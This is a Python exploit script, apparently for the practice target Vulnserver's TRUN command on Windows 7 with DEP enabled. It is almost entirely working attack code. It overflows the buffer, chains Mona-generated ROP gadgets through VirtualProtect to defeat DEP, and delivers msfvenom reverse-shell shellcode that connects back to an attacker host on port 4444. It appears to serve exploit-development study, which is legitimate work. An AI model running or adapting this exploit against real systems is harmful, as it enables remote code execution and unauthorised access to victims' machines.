#!/usr/bin/python

import socket
import struct
import sys


# Author : Nu11pwn
# September 3rd 2019
# 	Bypassing DEP using ROP chains generated by Mona via the VirtualProtect() method for disabling DEP
#	DEP is enabled on victim system
#	
#	Victim system :  Windows 7 sp1 + DEP enabled
#	Attacker system : Ubunutu 

victim_host = "10.0.0.213"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -b "\x00" -v shellcode -f c -f python

shellcode =  "" # shellcode without \x00 as a bad character
shellcode += "\xbb\xe8\x37\x7b\xfa\xda\xd1\xd9\x74\x24\xf4\x5a"
shellcode += "\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xb2"
shellcode += "\x39\x99\x0f\xbe\xae\xdf\xf0\x3e\x2f\x80\x79\xdb"
shellcode += "\x1e\x80\x1e\xa8\x31\x30\x54\xfc\xbd\xbb\x38\x14"
shellcode += "\x35\xc9\x94\x1b\xfe\x64\xc3\x12\xff\xd5\x37\x35"
shellcode += "\x83\x27\x64\x95\xba\xe7\x79\xd4\xfb\x1a\x73\x84"
shellcode += "\x54\x50\x26\x38\xd0\x2c\xfb\xb3\xaa\xa1\x7b\x20"
shellcode += "\x7a\xc3\xaa\xf7\xf0\x9a\x6c\xf6\xd5\x96\x24\xe0"
shellcode += "\x3a\x92\xff\x9b\x89\x68\xfe\x4d\xc0\x91\xad\xb0"
shellcode += "\xec\x63\xaf\xf5\xcb\x9b\xda\x0f\x28\x21\xdd\xd4"
shellcode += "\x52\xfd\x68\xce\xf5\x76\xca\x2a\x07\x5a\x8d\xb9"
shellcode += "\x0b\x17\xd9\xe5\x0f\xa6\x0e\x9e\x34\x23\xb1\x70"
shellcode += "\xbd\x77\x96\x54\xe5\x2c\xb7\xcd\x43\x82\xc8\x0d"
shellcode += "\x2c\x7b\x6d\x46\xc1\x68\x1c\x05\x8e\x5d\x2d\xb5"
shellcode += "\x4e\xca\x26\xc6\x7c\x55\x9d\x40\xcd\x1e\x3b\x97"
shellcode += "\x32\x35\xfb\x07\xcd\xb6\xfc\x0e\x0a\xe2\xac\x38"
shellcode += "\xbb\x8b\x26\xb8\x44\x5e\xe8\xe8\xea\x31\x49\x58"
shellcode += "\x4b\xe2\x21\xb2\x44\xdd\x52\xbd\x8e\x76\xf8\x44"
shellcode += "\x59\x73\xfd\x46\xd7\xeb\xff\x46\xf6\xb7\x76\xa0"
shellcode += "\x92\x57\xdf\x7b\x0b\xc1\x7a\xf7\xaa\x0e\x51\x72"
shellcode += "\xec\x85\x56\x83\xa3\x6d\x12\x97\x54\x9e\x69\xc5"
shellcode += "\xf3\xa1\x47\x61\x9f\x30\x0c\x71\xd6\x28\x9b\x26"
shellcode += "\xbf\x9f\xd2\xa2\x2d\xb9\x4c\xd0\xaf\x5f\xb6\x50"
shellcode += "\x74\x9c\x39\x59\xf9\x98\x1d\x49\xc7\x21\x1a\x3d"
shellcode += "\x97\x77\xf4\xeb\x51\x2e\xb6\x45\x08\x9d\x10\x01"
shellcode += "\xcd\xed\xa2\x57\xd2\x3b\x55\xb7\x63\x92\x20\xc8"
shellcode += "\x4c\x72\xa5\xb1\xb0\xe2\x4a\x68\x71\x12\x01\x30"
shellcode += "\xd0\xbb\xcc\xa1\x60\xa6\xee\x1c\xa6\xdf\x6c\x94"
shellcode += "\x57\x24\x6c\xdd\x52\x60\x2a\x0e\x2f\xf9\xdf\x30"
shellcode += "\x9c\xfa\xf5"


def create_rop_chain():

	# !mona rop -m *.dll -cp nonull

	rop_gadgets = [
		0x76e83b80,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
		0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
		0x76a0fd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
		0x7719054d,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
		0x625011af,  # & jmp esp [essfunc.dll]
		0x76e90990,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
		0xfffffdff,  # Value to negate, will become 0x00000201
		0x769f2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
		0x76a0f9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
		0x77185da8,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
		0xffffffc0,  # Value to negate, will become 0x00000040
		0x76a14cbd,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
		0x77216d70,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
		0x771a8cc6,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
		0x7660cb49,  # &Writable location [USP10.dll] ** REBASED ** ASLR
		0x77160a31,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
		0x76e21645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
		0x7727a30c,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
		0x90909090,  # nop
		0x7707e180,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

payload  = "A" * 2003 # fill up the buffer after calculating the offset
payload += rop_chain # generated with mona !mona rop -m *.dll -cp nonull
payload += "\x90" * 16 # nopsled to ensure the shellcode executes
payload += shellcode
payload += "C" * (3000 - 2006 - len(rop_chain) - 16 - len(shellcode))

buffer_exploit = "TRUN /.:/" + payload

try:
	expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	expl.connect((victim_host, port))
	expl.send(buffer_exploit)
	print("[x] Sent TRUN + malicious payload to the victim")
	print("[x] Sending ROP chain")
	print("[x] Sending shellcode to victim system")
	print("[x] Watch nc for a reverse shell")
	print("[!] You may need to send it multiple times")
	expl.close()
except:
	print("[!] Error connecting to victim, exploit failed")